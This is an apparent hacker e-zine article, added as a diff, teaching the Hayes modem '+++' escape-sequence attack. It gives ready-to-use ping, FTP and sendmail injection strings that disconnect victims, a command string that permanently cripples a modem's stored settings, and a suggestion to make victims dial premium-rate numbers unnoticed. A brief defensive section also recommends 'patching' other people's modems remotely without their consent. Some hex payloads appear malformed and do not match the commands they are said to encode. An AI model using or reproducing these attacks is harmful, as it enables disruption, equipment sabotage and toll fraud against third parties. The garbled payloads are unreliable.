@@ -1,0 +1,308 @@
+[======================> SWAT MAGAZINE ISSUE 27 <======================]
+[=========================> Fun with modems <==========================]
+[==============> Written by qwaszx <qwaszx@europe.com>  <==============]
+
+I'm now back after a couple of months away from the scene. Apologies to
+everyone for not delivering the promised UNIX tutorial, but it will
+continue next month. Note to the few people who sent me e-mail asking
+for help/info on the winpopup vulnerability and didnt get a reply: I
+did receive your emails, but a certain accident meant they were lost,
+if you could send them again please, and this time I will reply.
+
+Anyway on with the show....
+
+In this article I will take you through a simple DoS technique for
+analogue modems. I will also tell you how to protect yourselves from
+such attacks if you are vulnerable, and also how to patch other
+machines remotely.
+
+NOTE TO 'ADVANCED' HACKERS: Yes, I know this method is years old, but
+it still works on a surprising number of people, and theres much more
+fun to be had than merely hanging up their modems. This article has
+been written with the newbie in mind, so you may want to skip the first
+few sections.
+
+-==[ Background ]==-
+
+Modems are controlled using the AT command set. This basically means
+that you enter commands to the modem prefixed with AT. Examples are
+ATDT0800123123 and ATH0. (The first of which dials a number, the second
+disconnects the modem)
+
+Back when Hayes (The company who set the standards for modems) were
+designing the commands set, they hit upon a problem. How can a user
+enter commands to end the call while they are connected and sending
+data, not commands? To solve this problem, hayes introduced a method
+where you typed in +++ (three plus signs) to place the modem into
+command mode. You could then enter commands as normal. It is this +++
+sequence that forms the basis of the attack.
+
+-==[ Hayes modem commands ]==-
+
+
+For those of you new to using modems manually, here is a list of
+commands that you can use to control your modem. Fire up hyperterminal
+(or minicom if you use *nix), select the serial port your modem is
+connected to (usually COM4: for an internal one - if you managed to get
+an internal modem to work in linux, then you don't require these
+instructions :> ), and type away.
+
+ATDT - Dial a number using Tone Dialling - eg. ATDT123456 dials 123456
+       when used without any numbers after it, just sets the dialling
+       mode.
+ATDP - Diales a number using Pulse Dialling.
+ATH  - Takes the modem on/off hook. ATH0 on hook, ATH1 off hook.
+ATZ  - Initialize modem
+
+There are many, many more commands, but I suggest you refer to the
+manual that came with your modem (for winmodems and most cheap/modern
+modems, the REAL manual is usually on the installation CD in electronic
+format, the flimsy leaflet you usually get with modems _cannot_ be
+called a manual)
+
+-==[ The attack ]==-
+
+
+Now you know what a +++ does and what commands modems accept, lets see
+how we can exploit this....
+
+What the attacker needs to do is force the victim to send a +++ command
+sequence through their modem. There are a number of ways to do this,
+some of which I will describe below. Unfortunately, the modem won't
+accept the +++ command sequence from the outside, so we have to force
+the user to do it themselves.
+
+-< Ping >-
+
+Whenever you send a ping to somebody, they reply to say that their host
+is alive. Some versions of ping (unfortunately, not the standard
+windows one) will allow you to send arbitrary data to the other host,
+of which they have to reply with the exact same data.
+
+This means, you could ping them with +++ATH0 and they would have
+to reply, sending it through their modem. The modem interperets the
++++ATH0 as a signal to hang up, and the user immediately disconnects.
+
+example command line (unix ping):
+
+[user@localhost ~]$ ping -p 2b2b2b4154483000d lamer.victim.com
+
+
+If the command fails - you get an output like the following:
+
+PING lamer.victim.com (127.254.194.3): 56 data bytes
+64 bytes from 127.254.194.3: icmp_seq=0 ttl=255 time=0.3 ms
+64 bytes from 127.254.194.3: icmp_seq=1 ttl=255 time=0.2 ms
+64 bytes from 127.254.194.3: icmp_seq=2 ttl=255 time=0.2 ms
+ 
+--- 127.254.194.3 ping statistics ---
+3 packets transmitted, 3 packets received, 0% packet loss
+round-trip min/avg/max = 0.2/0.2/0.3 ms
+
+If it succeeds however, the ping command will not print any replies,
+because the user will have hung their modem up.
+
+-< FTP >-
+
+If the user is running an ftp server, you can use that to execute the
++++ command.
+
+Telnet to the victims host on port 21 and type in USER +++ATH0 followed
+by a <CR> character (hex 0d - hold ALT and type 010 on the numeric
+keypad to enter it at the keyboard) - the <CR> is so the modem will
+accept the command (classic case of - CLAIT student: "Why doesnt it
+work???" Teacher: "Erm, try pressing Return").
+
+The ftp server would normally respond with something like.
+
+331 Password required for +++ATH0
+
+This then goes through the modem, causing it to hang up, and bye bye
+victim. The attacker never gets to see the message because the victim
+has already hung up.
+
+-< Sendmail >-
+
+Similar to the FTP method. This one involves telnetting to port 25 of
+the victim, typing HELO mooha.com and then typing in VRFY +++ATH0.
+
+The victim would then reply +++ATH0 User unknown, which goes through
+the modem, causing the victim to hang up.
+
+
+-< Other methods >-
+
+There are many, many other ways to get this attack to work, including a
+method using IRC (I havent listed it here so you script kiddies will
+have something to look up this weekend).
+I have found that it works best if the method used echos the reply
+back. Some modems won't accept incoming +++ commands, but will accept
+outgoing commands. This is where the ping method works best.
+
+
+-==[ Alternatives to simply hanging the modem up ]==-
+
+As well as using the +++ATH0 command to hang up the victims modem,
+there are other things you can do. These all involve using other
+commands apart from the (now familiar) ATH0 command. Also, the 0 at the
+end of the ATH is really unneccesary. I have just added it to show that
+you are putting the modem on hook.
+
+-< Turning the victims Modem Speaker on >-
+
+The ATM command controls whether the speaker is switched on, and the
+ATL command controls its volume. So the following command string should
+make the victims modem shout out quite a bit.
+
++++ATL3M2O
+
+(The O command at the end place the modem back into data mode,
+otherwise any more data sent through the mdoem would be interpreted as
+commands, and the modem would hang up, which in this case is not what
+we want)
+
+Remember the modem has a carrier going through it, so when the modem
+speaker is turned on, the carrier sound will be really loud.
+
+-< Totally messing up the victims modem >-
+
+This one is really evil. What it does is reconfigure the modem so it is
+unable to work properly, saves it to the Non-volatile memory (so the
+settings stay there, even when the modem is switched off), and then
+proceeds to disconnect the victim.
+
+I will describe each part in turn, if there is a certain command or
+action you want to leave out, then just miss that command from the
+final sequence.
+
++++        - Places the modem in command mode
+AT         - Beginning of command sequence
+E0         - Turns off command echo (hiders victim when trying to
+             revive their modem)
+F1         - This limits the modem speed to 300 bps, thereby
+             preventing any useable internet connection.
+P          - Sets modem into pulse dial mode (a bit annoying when it
+             takes ages to dial a number)
+Q1         - Disables display of Error messages (eg NO CARRIER etc..)
+
+The following commands change the values of various registers in the
+modem. This can have some pretty devastating effects.
+
+S3=0       - This changes the Carriage return character to ASCII 0,
+             which is pretty hard to type on a keyboard. This will only
+             take effect AFTER the carriage return character that is
+             typed at the end of this command has been send, so we don't
+             have to mess around with our command sequence.
+
+S4=1       - This changes the line feed character (same notes as before)
+S5=2       - Backspace Character - the user will have a hard time
+             trying to delete any mistakes.
+S7=1       - This sets the wait time for a carrier after dialling to 1
+             second, making the modem hang up before it has chance to
+             connect.
+
+These two commands store the settings permanently (well, almost)
+
+&W0        - Stores the settings in the modems memory
+&Y0        - Selects the recently written settings as the default.
+
+And finally
+
+H          - Hang up their modem, and they wont be able to connect
+             again for quite a while.
+
+There are many, many more possibilities that you could use. The best
+place I can refer you to is your modem manual, or on the web (search
+for 'Hayes AT command set').
+
+-< Forcing the victim to dial out again >-
+
+The command ATDTxxxxxxx is used to dial a number, so the following
+command would hang up the victim, and force them to dial a number of
+your choice.
+
++++ATDT999
+
+There is no need for the ATH command as the Dial command hangs up the
+modem anyway. Substitute any phone number for the one shown above, and
+the victim would then dial that number. Its also a bad idea to make
+them dial your number because you will be on the internet at the time,
+and your phone will be engaged!
+Premium rate numbers would work best, especially if you turned off the
+speaker with ATM first. The victim may not realise he is connected
+until quite a while later.
+
+
+
+-==[ Problems with this techique ]==-
+
+As mentioned above, there are modems that are patched against the
+technique. Also, If your own modem is not patched, when you send the
+commands through your own modem, you will disconnect from the internet
+(or worse if you did the real killer commands).
+
+-==[ Protecting yourself ]==-
+
+There are a number of ways you can protect yourself. One way would be
+to install a firewall that would block ping packets and any other
+suspect traffic, but this wouldnt work against the ftp server attack,
+and there are too many different ways to execute the attack for this to
+be a practical solution.
+
+The best way is to stop the problem at its source: The modem itself.
+Remember that you need to send the sequence +++ before you can send
+commands. The modem has a register that tells it which character to
+accept for the escape sequence. Usually it is set to 43 decimal (ASCII
++), but can be set to any value, and on some modems, setting it to a
+number above 127 will disable the escape sequence altogther.
+
+So, while you are offline. Fire up Hyperterminal (or minicom for you
+linux gods), connect to your modem, and type in the following command.
+
+ATS2=255&W0
+
+and press enter. This sets the value of the escape sequence to be 255,
+which disables the function on most modems (and for others, makes the
+sequence something other than +++). Effectively preventing any kind of
+modem attack in this way. The &W0 simply saves the settings so you are
+permanently protected.
+
+-< Patching somebody elses modem remotely >-
+
+As the patch for the modem is a series of AT commands, it is actually
+possible to fix someones modem using the same method as the one used in
+the attack.
+
+Simply use the following command:
+
++++ATS2=255&W0O
+
+(The last two characters are a zero (0) and a capital letter o (O))
+And use any of the methods described above to patch the modem remotely.
+The O command at the end is designed to put the modem back in data mode
+in an attempt to keep the user online, but usually, they will end up
+disconnecting (but they will be safe in the knowledge that it really
+wont happen again).
+
+The ping command for the patch is as follows:
+
+ping -c 1 -p 2b2b2b415453323d32353526574f310d host
+
+
+-==[ Wrap up ]=--
+
+You now know what this attack is, how to execute it, and how to protect
+yourself from others. And you also know how to patch other people who
+are vulnerable. (I wonder if any of you will actually USE the remote
+patch? :) )
+
+One thing to note. Many modems are already patched, especially US
+robotics modems, so if you try any of the above methods and they don't
+work, then chances are, their modem is patched, OR they don't even have
+a modem.
+
+---
+Written by qwaszx for SWAT magazine
+Standard disclaimer applies - I'm not responsible for any inaccuracies
+(well you can't blow my head off or sue me for it at least), and what
+you do with this is at your own risk. YOU HAVE BEEN WARNED!!!
